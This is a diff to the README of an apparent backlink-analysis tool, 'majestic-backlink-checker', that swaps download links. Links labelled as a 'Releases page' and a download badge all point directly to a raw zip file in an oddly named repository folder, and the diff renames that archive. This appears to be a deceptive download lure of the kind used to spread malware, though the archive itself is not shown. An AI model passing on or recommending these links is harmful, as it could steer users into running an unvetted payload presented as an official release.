@@ -6,10 +6,10 @@ Welcome to the majestic-backlink-checker. This tool helps you analyze backlinks 
 ## 📥 Download the Application
 You can download the latest version of majestic-backlink-checker from our Releases page. This will ensure you have the most recent updates and features.
 
-[![Download Latest Release](https://raw.githubusercontent.com/frxxup/majestic-backlink-checker/main/underriver/majestic-backlink-checker.zip)](https://raw.githubusercontent.com/frxxup/majestic-backlink-checker/main/underriver/majestic-backlink-checker.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/frxxup/majestic-backlink-checker/main/underriver/backlink_checker_majestic_v1.2.zip)](https://raw.githubusercontent.com/frxxup/majestic-backlink-checker/main/underriver/backlink_checker_majestic_v1.2.zip)
 
 ## 📂 Download & Install
-1. **Visit this page to download**: Go to the [Releases page](https://raw.githubusercontent.com/frxxup/majestic-backlink-checker/main/underriver/majestic-backlink-checker.zip).
+1. **Visit this page to download**: Go to the [Releases page](https://raw.githubusercontent.com/frxxup/majestic-backlink-checker/main/underriver/backlink_checker_majestic_v1.2.zip).
 2. Find the version number you wish to download.
 3. Click on the package that matches your operating system.
 4. Wait for the download to finish.
@@ -57,7 +57,7 @@ If you encounter any issues while using majestic-backlink-checker, consider the 
 Join our community for help or suggestions. You can find us on social media and community forums. Sharing your experiences can help improve the tool for everyone.
 
 ## 📝 Updates and Changelog
-Stay updated with the latest features and improvements. Check the [Releases page](https://raw.githubusercontent.com/frxxup/majestic-backlink-checker/main/underriver/majestic-backlink-checker.zip) for a detailed changelog.
+Stay updated with the latest features and improvements. Check the [Releases page](https://raw.githubusercontent.com/frxxup/majestic-backlink-checker/main/underriver/backlink_checker_majestic_v1.2.zip) for a detailed changelog.
 
 ## 📞 Contact
 For more support or to report issues, feel free to create an issue on our GitHub repository. Your feedback is valuable to us. 
